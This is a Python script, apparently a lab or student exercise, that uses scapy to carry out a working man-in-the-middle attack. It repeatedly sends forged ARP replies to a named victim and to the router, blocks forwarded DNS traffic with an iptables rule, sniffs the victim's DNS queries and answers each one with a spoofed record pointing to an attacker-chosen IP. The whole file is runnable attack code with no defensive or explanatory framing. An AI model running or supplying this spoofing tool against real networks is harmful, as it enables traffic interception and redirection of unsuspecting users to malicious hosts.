#!/usr/bin/python3

import subprocess, os, re
import threading
import signal
from scapy.all import *

domain = "google.ca"
victimIP = "192.168.0.16"
routerIP = "192.168.0.100"
interface = "eno1"
redirectIP = "192.168.0.17"

def checkRootPrivilege():
    if os.geteuid() != 0:
        sys.exit("[!] Please run the script as root.")

def setup():
    # Disable fowarding of DNS request to router
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')
    # Add iptables rule to drop any DNS request
    subprocess.Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE)

def restore():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('0\n')
    # Remoce iptables rule to drop any DNS request
    subprocess.Popen(["iptables -D FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE,)
    print("Exiting...")

def getLocalMAC(interface):
    mac = ""
    try:
        mac = open('/sys/class/net/' + interface + '/address').readline()
    except:
        mac = "00:00:00:00:00:00"
    return mac[:17]

def getTargetMAC(IP):
    ans, unans = arping(IP)
    for s,r in ans:
        return r[Ether].src

def arpPoison(routerIP, victimIP, routerMAC, victimMAC):
    print("Starting ARP poisoning to {}".format(victimIP))
    while True:
        time.sleep(2)
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)

def parsePacket(packet):
    global redirectIP
    if packet.haslayer(DNS) and DNSQR in packet:
        response = (IP(dst=packet[IP].src, src=packet[IP].dst)/\
                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                    DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
                    an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=redirectIP)))
        send(response, verbose=0)

def listen(victimIP):
    mFilter = "udp and port 53 and src " + victimIP
    sniff(filter=mFilter, prn=parsePacket)

def main():
    global victimIP
    global interface
    global routerIP
    try:
        checkRootPrivilege()
        setup()

        victimMAC = getTargetMAC(victimIP)
        localMAC = getLocalMAC(interface)
        routerMAC = getTargetMAC(routerIP)

        arpThread = threading.Thread(target=arpPoison, args=(routerIP, victimIP, routerMAC, victimMAC))
        arpThread.daemon = True
        listenThread = threading.Thread(target=listen, args=(victimIP,))
        listenThread.daemon = True

        arpThread.start()
        listenThread.start()

        arpThread.join()
        listenThread.join()
    except KeyboardInterrupt:
        restore()
        sys.exit(0)

if __name__ == '__main__':
    main()